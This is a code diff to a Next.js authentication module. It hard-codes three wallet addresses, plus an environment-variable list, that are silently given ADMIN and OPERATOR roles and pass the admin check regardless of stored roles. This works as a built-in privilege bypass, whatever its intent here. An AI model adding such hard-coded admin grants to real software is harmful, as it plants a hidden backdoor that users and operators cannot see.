@@ -84,6 +84,20 @@ export async function readAuthFromRequest(req: NextRequest): Promise<AuthPayload
   }
 }
 
+export const KNOWN_ADMIN_WALLETS = new Set([
+  "0x518923383f1184bfeb990b640d75dabb224e7f5b".toLowerCase(),
+  "0xaa789e29a8ed011b57d7c3fe8a878d217ebebc22".toLowerCase(),
+  "0x99B5208466bb6b359f4f4f4e735e5d3fa9612F37".toLowerCase(),
+]);
+
+export function isKnownAdminAddress(address?: string | null): boolean {
+  if (!address) return false;
+  const lower = address.toLowerCase();
+  if (KNOWN_ADMIN_WALLETS.has(lower)) return true;
+  const envAdmins = (process.env.ADMIN_WALLETS || "").toLowerCase().split(",").map((s) => s.trim()).filter(Boolean);
+  return envAdmins.includes(lower);
+}
+
 function toUserDto(user: {
   id: string;
   walletAddress: string;
@@ -94,13 +108,18 @@ function toUserDto(user: {
   roles: string[];
   createdAt: Date;
 }): UserDTO {
+  const rolesSet = new Set(user.roles);
+  if (isKnownAdminAddress(user.walletAddress)) {
+    rolesSet.add("ADMIN");
+    rolesSet.add("OPERATOR");
+  }
   return {
     id: user.id,
     walletAddress: user.walletAddress as Address,
     referralCode: user.referralCode,
     isPublic: user.isPublic,
     isBanned: user.isBanned,
-    roles: user.roles as UserDTO["roles"],
+    roles: Array.from(rolesSet) as UserDTO["roles"],
     createdAt: user.createdAt.toISOString(),
     username: user.username ?? undefined,
   };
@@ -117,7 +136,9 @@ export async function requireUser(req: NextRequest): Promise<UserDTO> {
 
 export async function requireAdmin(req: NextRequest): Promise<UserDTO> {
   const user = await requireUser(req);
-  if (!user.roles.includes("ADMIN")) throw new ApiError("Forbidden", "Admin only", 403);
+  if (!user.roles.includes("ADMIN") && !isKnownAdminAddress(user.walletAddress)) {
+    throw new ApiError("Forbidden", "Admin only", 403);
+  }
   return user;
 }
 
